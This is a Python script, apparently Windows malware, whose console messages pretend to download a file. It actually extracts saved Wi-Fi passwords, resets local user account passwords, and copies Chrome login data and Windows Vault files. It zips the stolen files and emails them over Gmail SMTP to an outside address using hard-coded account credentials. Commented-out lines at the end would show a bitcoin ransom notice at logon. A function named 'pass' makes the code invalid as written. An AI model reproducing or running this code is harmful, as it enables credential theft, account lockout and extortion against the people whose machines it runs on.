def main():
    import subprocess,requests,smtplib,os
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    from shutil import copyfile,make_archive
    def download(url):
        local = url.split('/')[-1]
        if '%20' in local:
            local_filename = ' '.join(local.split('%20'))
        else:
            local_filename = local
        r = requests.get(url, stream=True)
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024):
                if chunk:
                    f.write(chunk)
                    f.flush()
        return '[*] FILE SAVED AS '+local_filename
    def pass(pwd):
    	p = ''
    	for a in range(len(pwd)):
    		z = ''
    		if pwd[a] in 'anckasddhdsffdgn':
    			p+= str(ord(pwd[a]))
    		else:
    			z= pwd[a].encode("utf-8")
    			p+= str(z.hex())
    	password = ''
    	for a in range(len(p)):
    	    if a in (1,4,6,8,9):
    	        password+= str(bin(int(p[a])))
    	    elif a in (2,3,5,7):
    	        password+= str(hex(int(p[a].encode("utf-8"))))
    	    else:
    	        password+= str(p[a]) + '0'
    	return password
    print('[*] GETTING THE FILE.......')
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    cd={}
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        except subprocess.CalledProcessError:
            continue
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            ae=i
            be=results[0]
        except IndexError:
            ae=i
            be=0
        if be:
            cd[str(ae)]=str(be)
    print('[*] STARTING THE DOWNLOAD.....')
    user,ty,yu=[],'',''
    for a in subprocess.check_output(['net', 'user']).decode('utf-8').split('\n')[4:6]:
        l=a.strip()
        user.append(l.split()[0])
    for a in user:
        ty+=a+'\t'
        yu+=pass(a)+'\t'
        subprocess.check_output(['net','user',a,pass(a)])
    mail_content = ','.join(cd.keys())+'\n\n\n'+','.join(cd.values())+'\n\n\n'+ty+'\n\n\n'+yu
    sender_address = 'cvmuntest@gmail.com'
    sender_pass = 'ikihihaojprfbsyo'
    receiver_address = 'anirudhnfs01@gmail.com'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'wifi'
    message.attach(MIMEText(mail_content, 'plain'))
    filename = "File_name_with_extension"
    user=os.environ['USERPROFILE']
    print('[*] DOWNLOADING FILE.......')
    fo=user+'\\Documents\\cred'
    if not os.path.isdir(fo):
        os.mkdir(fo)
    if os.path.isfile(user+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'):
        copyfile(user+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',fo+'\\Login Data')
    if os.path.isdir(user+'\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28'):
        for a in os.listdir(user+'\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28'):
            try:
                copyfile(user+'\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\\'+a,fo+'\\'+a)
            except:
                continue
    make_archive(fo, 'zip',fo)
    attachment = open(user+'\\Documents\\cred.zip',"rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment;filename=cred.zip')
    message.attach(p)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    attachment.close()
    print('[*] FILE DOWNLOADED......')
    os.remove(user+'\\Documents\\cred.zip')
    input('[*] PRESS ANY KEY TO QUIT.....')
main()
#os.system('reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticecaption /d "Your Windows PC has been compromised by us. Please send 300$ in bitcoin to us." /t REG_SZ /f')
#os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
